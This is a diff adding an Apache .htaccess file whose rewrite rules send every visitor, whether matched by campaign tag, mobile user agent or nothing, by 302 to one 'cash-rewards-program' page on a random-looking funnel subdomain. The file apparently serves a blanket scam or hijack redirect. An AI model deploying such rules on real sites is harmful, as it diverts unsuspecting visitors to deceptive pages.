@@ -1,0 +1,12 @@
+RewriteEngine On
+
+# Capture UTM parameters and check if it matches
+RewriteCond %{QUERY_STRING} utm_campaign=__AID_NAME__ [NC]
+RewriteRule ^(.*)$ https://zxdsdqweasd.myfunnelish.com/cash-rewards-program-1740087057028926?%{QUERY_STRING} [R=302,L]
+
+# Check if the User-Agent is a mobile device
+RewriteCond %{HTTP_USER_AGENT} "Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini" [NC]
+RewriteRule ^(.*)$ https://zxdsdqweasd.myfunnelish.com/cash-rewards-program-1740087057028926?%{QUERY_STRING} [R=302,L]
+
+# Default redirection (for desktop users)
+RewriteRule ^(.*)$ https://zxdsdqweasd.myfunnelish.com/cash-rewards-program-1740087057028926?%{QUERY_STRING} [R=302,L]
